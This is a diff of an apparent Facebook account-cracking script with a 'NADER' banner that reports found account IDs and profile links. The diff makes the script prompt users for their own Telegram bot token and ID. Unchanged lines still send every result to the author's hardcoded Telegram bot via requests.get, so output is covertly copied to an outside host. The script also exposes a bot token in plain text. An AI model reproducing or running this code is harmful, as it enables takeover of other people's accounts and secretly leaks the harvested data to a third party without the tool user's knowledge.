@@ -111,12 +111,12 @@ B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 print('''\033[1;31m<\033[1;32m<\033[1;33mN\033[1;34mA\033[1;35mD\033[1;36mE\033[1;34mR\033[1;31m>\033[1;32m>''')
-#print('')
-#print('\033[1;32mادخل توكن بوتك')
-token=('6385664119:AAE5JP9myc7NBsO9gcP-2Z8w_LNWj9KdsnM')
-#print('\n')
-#print('\033[1;32mادخل ايدي بوتك')
-ID=('1350971290')
+print('')
+print('\033[1;32mادخل توكن بوتك')    
+token=input('\033[1;31mT\033[1;32mO\033[1;33mK\033[1;34mE\033[1;36mN\033[1;35m :\033[1;32m ')
+print('\n')
+print('\033[1;32mادخل ايدي بوتك')
+id=input('\033[1;31mI\033[1;34mD \033[1;32m   : ')
 os.system('clear')
 cetak(nel('\t• Sedang Menginstall Modul Requests •'))
 
@@ -1109,7 +1109,7 @@ BY = @N_0_N_7  —  Bot = @nader20090
 ⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏━─────⋙ 
 BY = @N_0_N_7  —  Bot = @nader20090
 𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
-
+[✓]ID : tg://openmessage?user_id={ID}
 ''')
 					requests.get("https://api.telegram.org/bot6385664119:AAE5JP9myc7NBsO9gcP-2Z8w_LNWj9KdsnM/sendMessage?chat_id=1350971290&text="+str(tlg))            
 					
@@ -1168,7 +1168,7 @@ BY = @N_0_N_7  —  Bot = @nader20090
 ⋘─────━𓆩𝐍𝐀𝐃𝐄𝐑𓆪‏━─────⋙ 
 BY = @N_0_N_7  —  Bot = @nader20090
 𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
-
+[✓]ID : tg://openmessage?user_id={ID}
 ''')
 					requests.get("https://api.telegram.org/bot6385664119:AAE5JP9myc7NBsO9gcP-2Z8w_LNWj9KdsnM/sendMessage?chat_id=1350971290&text="+str(tlg))     
 
